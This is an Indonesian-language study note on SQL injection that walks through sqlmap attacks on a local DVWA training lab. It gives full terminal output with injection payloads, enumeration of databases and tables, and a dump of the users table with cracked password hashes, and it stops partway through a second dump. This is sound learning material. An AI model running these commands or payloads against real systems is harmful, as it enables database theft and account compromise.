---
id: Memahami SQL Injection
aliases: []
tags:
  - sql
  - hacking_fundamentals
---

# Apa itu SQL Injection

SQL injection adalah teknik untuk exploitasi database, salah satun alatnya adalah `sqlmap`

# Jenis SQL Injection

1. Blind SQL Injection

   Injeksi tidak terlihat, ada bug tapi tidak kelihatan, biasanya pakai SQLMAP manual juga bisa dengan melakukan ekstraksi lalu dikirim ke weebhook kita

2. Union-Based SQL Injection

   Memanfaatkan sebuah perintah dari SQL atau query yaitu union, pertama cari kolom, cari kolom yang ditargetkan

3. Error-Based SQL Injection

   Memanfaatkan tampilan error pada sql injection nya

# Demo DVWA

1. Cek kerentanan SQL injection dengan memberikan tanda kutip

   ```livescript
   3'
   ```

   - Yang akan terjadi web akan menampilkan error jika rentan SQL Injection
   - Selain itu web akan rusak tampilan UI nya jika rentan SQL Injection

2. Dengan tools `sqlmap`

   ```Powershell
   ┌──(kyouma㉿kali)-[~/Hacking/Tools/dirsearch]
   └─$ sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="PHPSESSID=bcec15f1e02424725fa9f8e8ee4c61be; security=low"

           ___
          __H__
    ___ ___[(]_____ ___ ___  {1.8.11#stable}
   |_ -| . [']     | .'| . |
   |___|_  [.]_|_|_|__,|  _|
         |_|V...       |_|   https://sqlmap.org

   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

   [*] starting @ 06:13:11 /2024-12-03/

   [06:13:11] [INFO] resuming back-end DBMS 'mysql'
   [06:13:11] [INFO] testing connection to the target URL
   sqlmap resumed the following injection point(s) from stored session:
   ---
   Parameter: id (GET)
       Type: boolean-based blind
       Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
       Payload: id=2' OR NOT 9718=9718#&Submit=Submit

       Type: error-based
       Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
       Payload: id=2' AND (SELECT 1488 FROM(SELECT COUNT(*),CONCAT(0x71706b7071,(SELECT (ELT(1488=1488,1))),0x71626a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- SwQi&Submit=Submit

       Type: time-based blind
       Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
       Payload: id=2' AND (SELECT 8419 FROM (SELECT(SLEEP(5)))hKvo)-- OVdZ&Submit=Submit

       Type: UNION query
       Title: MySQL UNION query (NULL) - 2 columns
       Payload: id=2' UNION ALL SELECT CONCAT(0x71706b7071,0x4b47504f7a43426c6f75756b44477254644b74514c795663464f43586b5071745a7a71645a417257,0x71626a6b71),NULL#&Submit=Submit
   ---
   [06:13:11] [INFO] the back-end DBMS is MySQL
   web server operating system: Linux Debian
   web application technology: Apache 2.4.62, PHP 8.4.1
   back-end DBMS: MySQL >= 5.0 (MariaDB fork)
   [06:13:11] [INFO] fetched data logged to text files under '/home/kyouma/.local/share/sqlmap/output/127.0.0.1'

   [*] ending @ 06:13:11 /2024-12-03/
   ```

   Diatas bisa dilihat diberikan beberapa contoh payload tipe serangan SQL injection

3. Cek Database apa aja yang ada

   ```livescript
   ┌──(kyouma㉿kali)-[~/Hacking/Tools/dirsearch]
   └─$ sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="PHPSESSID=bcec15f1e02424725fa9f8e8ee4c61be; security=low" --dbs

           ___
          __H__
    ___ ___[.]_____ ___ ___  {1.8.11#stable}
   |_ -| . [']     | .'| . |
   |___|_  [,]_|_|_|__,|  _|
         |_|V...       |_|   https://sqlmap.org

   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

   [*] starting @ 06:16:35 /2024-12-03/

   [06:16:35] [INFO] resuming back-end DBMS 'mysql'
   [06:16:35] [INFO] testing connection to the target URL
   sqlmap resumed the following injection point(s) from stored session:
   ---
   Parameter: id (GET)
       Type: boolean-based blind
       Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
       Payload: id=2' OR NOT 9718=9718#&Submit=Submit

       Type: error-based
       Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
       Payload: id=2' AND (SELECT 1488 FROM(SELECT COUNT(*),CONCAT(0x71706b7071,(SELECT (ELT(1488=1488,1))),0x71626a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- SwQi&Submit=Submit

       Type: time-based blind
       Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
       Payload: id=2' AND (SELECT 8419 FROM (SELECT(SLEEP(5)))hKvo)-- OVdZ&Submit=Submit

       Type: UNION query
       Title: MySQL UNION query (NULL) - 2 columns
       Payload: id=2' UNION ALL SELECT CONCAT(0x71706b7071,0x4b47504f7a43426c6f75756b44477254644b74514c795663464f43586b5071745a7a71645a417257,0x71626a6b71),NULL#&Submit=Submit
   ---
   [06:16:35] [INFO] the back-end DBMS is MySQL
   web server operating system: Linux Debian
   web application technology: Apache 2.4.62, PHP 8.4.1
   back-end DBMS: MySQL >= 5.0 (MariaDB fork)
   [06:16:35] [INFO] fetching database names
   [06:16:35] [WARNING] reflective value(s) found and filtering out
   available databases [2]:
   [*] dvwa
   [*] information_schema

   [06:16:35] [INFO] fetched data logged to text files under '/home/kyouma/.local/share/sqlmap/output/127.0.0.1'

   [*] ending @ 06:16:35 /2024-12-03/
   ```

   - Bisa dilihat ada dua database, dvwa dan information_schema

4. Cek isi tabel dari dvwa

   ```livescript
   ┌──(kyouma㉿kali)-[~/Hacking/Tools/dirsearch]
   └─$ sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="PHPSESSID=bcec15f1e02424725fa9f8e8ee4c61be; security=low" -D dvwa --tables

           ___
          __H__
    ___ ___[']_____ ___ ___  {1.8.11#stable}
   |_ -| . ["]     | .'| . |
   |___|_  [,]_|_|_|__,|  _|
         |_|V...       |_|   https://sqlmap.org

   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

   [*] starting @ 06:21:31 /2024-12-03/

   [06:21:32] [INFO] resuming back-end DBMS 'mysql'
   [06:21:32] [INFO] testing connection to the target URL
   sqlmap resumed the following injection point(s) from stored session:
   ---
   Parameter: id (GET)
       Type: boolean-based blind
       Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
       Payload: id=2' OR NOT 9718=9718#&Submit=Submit

       Type: error-based
       Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
       Payload: id=2' AND (SELECT 1488 FROM(SELECT COUNT(*),CONCAT(0x71706b7071,(SELECT (ELT(1488=1488,1))),0x71626a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- SwQi&Submit=Submit

       Type: time-based blind
       Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
       Payload: id=2' AND (SELECT 8419 FROM (SELECT(SLEEP(5)))hKvo)-- OVdZ&Submit=Submit

       Type: UNION query
       Title: MySQL UNION query (NULL) - 2 columns
       Payload: id=2' UNION ALL SELECT CONCAT(0x71706b7071,0x4b47504f7a43426c6f75756b44477254644b74514c795663464f43586b5071745a7a71645a417257,0x71626a6b71),NULL#&Submit=Submit
   ---
   [06:21:32] [INFO] the back-end DBMS is MySQL
   web server operating system: Linux Debian
   web application technology: Apache 2.4.62, PHP 8.4.1
   back-end DBMS: MySQL >= 5.0 (MariaDB fork)
   [06:21:32] [INFO] fetching tables for database: 'dvwa'
   [06:21:32] [WARNING] reflective value(s) found and filtering out
   Database: dvwa
   [2 tables]
   +-----------+
   | guestbook |
   | users     |
   +-----------+

   [06:21:32] [INFO] fetched data logged to text files under '/home/kyouma/.local/share/sqlmap/output/127.0.0.1'

   [*] ending @ 06:21:32 /2024-12-03/

   ```

5. Cek column guestbook

   ```livescript
   ┌──(kyouma㉿kali)-[~/Hacking/Tools/dirsearch]
   └─$ sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="PHPSESSID=bcec15f1e02424725fa9f8e8ee4c61be; security=low" -D dvwa -T guestbook --columns

           ___
          __H__
    ___ ___[)]_____ ___ ___  {1.8.11#stable}
   |_ -| . [)]     | .'| . |
   |___|_  [,]_|_|_|__,|  _|
         |_|V...       |_|   https://sqlmap.org

   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

   [*] starting @ 06:26:04 /2024-12-03/

   [06:26:04] [INFO] resuming back-end DBMS 'mysql'
   [06:26:04] [INFO] testing connection to the target URL
   sqlmap resumed the following injection point(s) from stored session:
   ---
   Parameter: id (GET)
       Type: boolean-based blind
       Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
       Payload: id=2' OR NOT 9718=9718#&Submit=Submit

       Type: error-based
       Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
       Payload: id=2' AND (SELECT 1488 FROM(SELECT COUNT(*),CONCAT(0x71706b7071,(SELECT (ELT(1488=1488,1))),0x71626a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- SwQi&Submit=Submit

       Type: time-based blind
       Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
       Payload: id=2' AND (SELECT 8419 FROM (SELECT(SLEEP(5)))hKvo)-- OVdZ&Submit=Submit

       Type: UNION query
       Title: MySQL UNION query (NULL) - 2 columns
       Payload: id=2' UNION ALL SELECT CONCAT(0x71706b7071,0x4b47504f7a43426c6f75756b44477254644b74514c795663464f43586b5071745a7a71645a417257,0x71626a6b71),NULL#&Submit=Submit
   ---
   [06:26:04] [INFO] the back-end DBMS is MySQL
   web server operating system: Linux Debian
   web application technology: PHP 8.4.1, Apache 2.4.62
   back-end DBMS: MySQL >= 5.0 (MariaDB fork)
   [06:26:04] [INFO] fetching columns for table 'guestbook' in database 'dvwa'
   [06:26:04] [WARNING] reflective value(s) found and filtering out
   Database: dvwa
   Table: guestbook
   [3 columns]
   +------------+----------------------+
   | Column     | Type                 |
   +------------+----------------------+
   | comment    | varchar(300)         |
   | name       | varchar(100)         |
   | comment_id | smallint(5) unsigned |
   +------------+----------------------+

   [06:26:04] [INFO] fetched data logged to text files under '/home/kyouma/.local/share/sqlmap/output/127.0.0.1'

   [*] ending @ 06:26:04 /2024-12-03/
   ```

6. Melihat isi column, dengan `—dump`

   ```livescript
   ┌──(kyouma㉿kali)-[~/Hacking/Tools/dirsearch]
   └─$ sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="PHPSESSID=bcec15f1e02424725fa9f8e8ee4c61be; security=low" -D dvwa -T users --dump

           ___
          __H__
    ___ ___[(]_____ ___ ___  {1.8.11#stable}
   |_ -| . [,]     | .'| . |
   |___|_  [']_|_|_|__,|  _|
         |_|V...       |_|   https://sqlmap.org

   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

   [*] starting @ 06:28:56 /2024-12-03/

   [06:28:56] [INFO] resuming back-end DBMS 'mysql'
   [06:28:56] [INFO] testing connection to the target URL
   sqlmap resumed the following injection point(s) from stored session:
   ---
   Parameter: id (GET)
       Type: boolean-based blind
       Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
       Payload: id=2' OR NOT 9718=9718#&Submit=Submit

       Type: error-based
       Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
       Payload: id=2' AND (SELECT 1488 FROM(SELECT COUNT(*),CONCAT(0x71706b7071,(SELECT (ELT(1488=1488,1))),0x71626a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- SwQi&Submit=Submit

       Type: time-based blind
       Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
       Payload: id=2' AND (SELECT 8419 FROM (SELECT(SLEEP(5)))hKvo)-- OVdZ&Submit=Submit

       Type: UNION query
       Title: MySQL UNION query (NULL) - 2 columns
       Payload: id=2' UNION ALL SELECT CONCAT(0x71706b7071,0x4b47504f7a43426c6f75756b44477254644b74514c795663464f43586b5071745a7a71645a417257,0x71626a6b71),NULL#&Submit=Submit
   ---
   [06:28:57] [INFO] the back-end DBMS is MySQL
   web server operating system: Linux Debian
   web application technology: Apache 2.4.62, PHP 8.4.1
   back-end DBMS: MySQL >= 5.0 (MariaDB fork)
   [06:28:57] [INFO] fetching columns for table 'users' in database 'dvwa'
   [06:28:57] [WARNING] reflective value(s) found and filtering out
   [06:28:57] [INFO] fetching entries for table 'users' in database 'dvwa'
   [06:28:57] [INFO] recognized possible password hashes in column 'password'
   do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
   do you want to crack them via a dictionary-based attack? [Y/n/q] Y
   [06:29:41] [INFO] using hash method 'md5_generic_passwd'
   what dictionary do you want to use?
   [1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
   [2] custom dictionary file
   [3] file with list of dictionary files
   > 1
   [06:29:56] [INFO] using default dictionary
   do you want to use common password suffixes? (slow!) [y/N] n
   [06:30:01] [INFO] starting dictionary-based cracking (md5_generic_passwd)
   [06:30:01] [INFO] starting 12 processes
   [06:30:03] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'
   [06:30:04] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'
   [06:30:06] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'
   [06:30:07] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
   Database: dvwa
   Table: users
   [5 entries]
   +---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
   | user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
   +---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
   | 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2024-11-28 15:16:19 | 0            |
   | 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2024-11-28 15:16:19 | 0            |
   | 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2024-11-28 15:16:19 | 0            |
   | 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2024-11-28 15:16:19 | 0            |
   | 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2024-11-28 15:16:19 | 0            |
   +---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+

   [06:30:09] [INFO] table 'dvwa.users' dumped to CSV file '/home/kyouma/.local/share/sqlmap/output/127.0.0.1/dump/dvwa/users.csv'
   [06:30:09] [INFO] fetched data logged to text files under '/home/kyouma/.local/share/sqlmap/output/127.0.0.1'

   [*] ending @ 06:30:09 /2024-12-03/
   ```

## Blind SQL Injection

Berbeda dengan sql biasa, yang blinnd ini ketika masukan id = `3'`yang tampil hanya halaman was an error biasa

### Exploitation

1. Ubah security ke medium
2. Submit lalu inspect halaman, ke network lalu headers, copy request URL nya

   ```livescript
   http://127.0.0.1:4280/vulnerabilities/sqli_blind/
   ```

3. Pergi ke sqlmap

   ```livescript
   ┌──(kyouma㉿kali)-[~/Hacking/Tools/dirsearch]
   └─$ sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli_blind/" --data="id=1&Submit=submit" --cookie="PHPSESSID=bcec15f1e02424725fa9f8e8ee4c61be; security=medium"
           ___
          __H__
    ___ ___["]_____ ___ ___  {1.8.11#stable}
   |_ -| . [(]     | .'| . |
   |___|_  [.]_|_|_|__,|  _|
         |_|V...       |_|   https://sqlmap.org

   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

   [*] starting @ 06:40:37 /2024-12-03/

   [06:40:37] [INFO] testing connection to the target URL
   [06:40:38] [INFO] checking if the target is protected by some kind of WAF/IPS
   [06:40:38] [INFO] testing if the target URL content is stable
   [06:40:38] [INFO] target URL content is stable
   [06:40:38] [INFO] testing if POST parameter 'id' is dynamic
   [06:40:38] [WARNING] POST parameter 'id' does not appear to be dynamic
   [06:40:38] [WARNING] heuristic (basic) test shows that POST parameter 'id' might not be injectable
   [06:40:38] [INFO] testing for SQL injection on POST parameter 'id'
   [06:40:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
   [06:40:38] [INFO] POST parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="User ID exists in the database.")
   [06:40:39] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
   it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
   for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
   [06:41:11] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
   [06:41:11] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
   [06:41:11] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
   [06:41:11] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
   [06:41:11] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
   [06:41:11] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
   [06:41:11] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
   [06:41:11] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
   [06:41:11] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
   [06:41:11] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
   [06:41:11] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
   [06:41:11] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
   [06:41:11] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
   [06:41:11] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
   [06:41:11] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
   [06:41:11] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
   [06:41:11] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
   [06:41:11] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
   [06:41:11] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
   [06:41:11] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
   [06:41:11] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
   [06:41:11] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
   [06:41:11] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
   [06:41:11] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
   [06:41:11] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
   [06:41:11] [INFO] testing 'Generic inline queries'
   [06:41:11] [INFO] testing 'MySQL inline queries'
   [06:41:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
   [06:41:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
   [06:41:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
   [06:41:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
   [06:41:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
   [06:41:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
   [06:41:12] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
   [06:41:22] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
   [06:41:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
   [06:41:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
   [06:41:22] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
   [06:41:22] [INFO] target URL appears to have 2 columns in query
   do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] n
   injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
   [06:42:11] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
   [06:42:11] [INFO] target URL appears to be UNION injectable with 2 columns
   injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
   [06:42:24] [INFO] testing 'MySQL UNION query (85) - 1 to 20 columns'
   [06:42:24] [INFO] testing 'MySQL UNION query (85) - 21 to 40 columns'
   [06:42:25] [INFO] testing 'MySQL UNION query (85) - 41 to 60 columns'
   [06:42:25] [INFO] testing 'MySQL UNION query (85) - 61 to 80 columns'
   [06:42:25] [INFO] testing 'MySQL UNION query (85) - 81 to 100 columns'
   [06:42:25] [INFO] checking if the injection point on POST parameter 'id' is a false positive
   POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
   sqlmap identified the following injection point(s) with a total of 236 HTTP(s) requests:
   ---
   Parameter: id (POST)
       Type: boolean-based blind
       Title: AND boolean-based blind - WHERE or HAVING clause
       Payload: id=1 AND 1085=1085&Submit=submit

       Type: time-based blind
       Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
       Payload: id=1 AND (SELECT 2023 FROM (SELECT(SLEEP(5)))Uqyg)&Submit=submit
   ---
   [06:42:48] [INFO] the back-end DBMS is MySQL
   web server operating system: Linux Debian
   web application technology: PHP 8.4.1, Apache 2.4.62
   back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
   [06:42:48] [INFO] fetched data logged to text files under '/home/kyouma/.local/share/sqlmap/output/127.0.0.1'

   [*] ending @ 06:42:48 /2024-12-03/
   ```

   Diketahui ada dua teknik yang disarankan, boolean-based blind dan time-based blind

4. Selanjutnya cek dulu databasenya

   ```livescript
   ┌──(kyouma㉿kali)-[~/Hacking/Tools/dirsearch]
   └─$ sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli_blind/" --data="id=1&Submit=submit" --cookie="PHPSESSID=bcec15f1e02424725fa9f8e8ee4c61be; security=medium" --dbs
           ___
          __H__
    ___ ___[']_____ ___ ___  {1.8.11#stable}
   |_ -| . ["]     | .'| . |
   |___|_  [)]_|_|_|__,|  _|
         |_|V...       |_|   https://sqlmap.org

   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

   [*] starting @ 06:44:55 /2024-12-03/

   [06:44:55] [INFO] resuming back-end DBMS 'mysql'
   [06:44:55] [INFO] testing connection to the target URL
   sqlmap resumed the following injection point(s) from stored session:
   ---
   Parameter: id (POST)
       Type: boolean-based blind
       Title: AND boolean-based blind - WHERE or HAVING clause
       Payload: id=1 AND 1085=1085&Submit=submit

       Type: time-based blind
       Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
       Payload: id=1 AND (SELECT 2023 FROM (SELECT(SLEEP(5)))Uqyg)&Submit=submit
   ---
   [06:44:55] [INFO] the back-end DBMS is MySQL
   web server operating system: Linux Debian
   web application technology: PHP 8.4.1, Apache 2.4.62
   back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
   [06:44:55] [INFO] fetching database names
   [06:44:55] [INFO] fetching number of databases
   [06:44:55] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
   [06:44:55] [INFO] retrieved: 2
   [06:44:55] [INFO] retrieved: information_schema
   [06:44:57] [INFO] retrieved: dvwa
   available databases [2]:
   [*] dvwa
   [*] information_schema

   [06:44:57] [INFO] fetched data logged to text files under '/home/kyouma/.local/share/sqlmap/output/127.0.0.1'

   [*] ending @ 06:44:57 /2024-12-03/
   ```

5. Cek table nya

   ```livescript
   ┌──(kyouma㉿kali)-[~/Hacking/Tools/dirsearch]
   └─$ sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli_blind/" --data="id=1&Submit=submit" --cookie="PHPSESSID=bcec15f1e02424725fa9f8e8ee4c61be; security=medium" -D dvwa --tables
           ___
          __H__
    ___ ___[)]_____ ___ ___  {1.8.11#stable}
   |_ -| . [']     | .'| . |
   |___|_  [.]_|_|_|__,|  _|
         |_|V...       |_|   https://sqlmap.org

   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

   [*] starting @ 06:51:30 /2024-12-03/

   [06:51:31] [INFO] resuming back-end DBMS 'mysql'
   [06:51:31] [INFO] testing connection to the target URL
   sqlmap resumed the following injection point(s) from stored session:
   ---
   Parameter: id (POST)
       Type: boolean-based blind
       Title: AND boolean-based blind - WHERE or HAVING clause
       Payload: id=1 AND 1085=1085&Submit=submit

       Type: time-based blind
       Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
       Payload: id=1 AND (SELECT 2023 FROM (SELECT(SLEEP(5)))Uqyg)&Submit=submit
   ---
   [06:51:31] [INFO] the back-end DBMS is MySQL
   web server operating system: Linux Debian
   web application technology: PHP 8.4.1, Apache 2.4.62
   back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
   [06:51:31] [INFO] fetching tables for database: 'dvwa'
   [06:51:31] [INFO] fetching number of tables for database 'dvwa'
   [06:51:31] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
   [06:51:31] [INFO] retrieved: 2
   [06:51:31] [INFO] retrieved: users
   [06:51:32] [INFO] retrieved: guestbook
   Database: dvwa
   [2 tables]
   +-----------+
   | guestbook |
   | users     |
   +-----------+

   [06:51:32] [INFO] fetched data logged to text files under '/home/kyouma/.local/share/sqlmap/output/127.0.0.1'

   [*] ending @ 06:51:32 /2024-12-03/
   ```

6. Cek dump

   ```livescript
   ┌──(kyouma㉿kali)-[~/Hacking/Tools/dirsearch]
   └─$ sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli_blind/" --data="id=1&Submit=submit" --cookie="PHPSESSID=bcec15f1e02424725fa9f8e8ee4c61be; security=medium" -D dvwa -T guestbook --dump
           ___
          __H__
    ___ ___["]_____ ___ ___  {1.8.11#stable}
   |_ -| . [.]     | .'| . |
   |___|_  ["]_|_|_|__,|  _|
         |_|V...       |_|   https://sqlmap.org

   [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

   [*] starting @ 06:52:15 /2024-12-03/

   [06:52:15] [INFO] resuming back-end DBMS 'mysql'
   [06:52:15] [INFO] testing connection to the target URL
   sqlmap resumed the following injection point(s) from stored session:
   ---
   Parameter: id (POST)
       Type: boolean-based blind
       Title: AND boolean-based blind - WHERE or HAVING clause
       Payload: id=1 AND 1085=1085&Submit=submit

       Type: time-based blind
       Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
       Payload: id=1 AND (SELECT 2023 FROM (SELECT(SLEEP(5)))Uqyg)&Submit=submit
   ---
   [06:52:15] [INFO] the back-end DBMS is MySQL
   web server operating system: Linux Debian
   web application technology: PHP 8.4.1, Apache 2.4.62
   back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
   [06:52:15] [INFO] fetching columns for table 'guestbook' in database 'dvwa'
   [06:52:15] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
   [06:52:15] [INFO] retrieved: 3
   [06:52:16] [INFO] retrieved: comment_id
   [06:52:16] [INFO] retrieved: comment
   [06:52:17] [INFO] retrieved: name
